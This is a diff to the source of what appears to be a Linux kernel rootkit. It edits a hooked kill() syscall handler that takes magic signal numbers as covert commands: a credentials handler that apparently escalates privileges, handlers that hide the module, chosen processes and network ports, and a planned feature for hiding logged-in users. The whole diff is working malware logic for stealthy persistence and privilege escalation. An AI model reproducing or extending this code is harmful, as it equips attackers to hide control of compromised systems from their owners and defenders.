@@ -231,33 +231,44 @@ static asmlinkage int hook_kill(pid_t pid, int sig) {
 
     switch (sig) {
 
-         // Credentials Handler
-        case 60: 
+        // Credentials Handler
+        case 34: 
             err = credential_handler_wrapper(sig, pid);
             if (err) {
-                return orig_kill(regs);
+                return orig_kill(pid, sig);
             }
             return 0;
 
         // Presence Handler
-        case 61:
-        case 62:
-        case 63:
+        case 35: // Presence Toggle
+        case 41: // Add process to hide
+        case 42: // Remove process to hide
+        case 43: // Show hidden processes linked list
+        case 51: // Add port to hide 
+        case 52: // Remove port to hide
+        case 53: // Show hidden ports linked list
+        //TODO
+        /*
+        * case 61: Add hidden logged in user 
+        * case 62: Remove hidden logged in user
+        * case 63: Show hidden logged in users
+        *
+        * */
             err = presence_handler_wrapper(sig, pid);
             if (err) {
-                return orig_kill(regs);
+                return orig_kill(pid, sig);
             }
             return 0;
         
         // RNG HANDLER
-        case 64:
+        case 36:
             err = rng_handler_wrapper(sig, pid);
             if (err) {
-                return orig_kill(regs);
+                return orig_kill(pid, sig);
             }
             return 0;
         default:
-            return orig_kill(regs);
+            return orig_kill(pid, sig);
     }
 }
 #endif
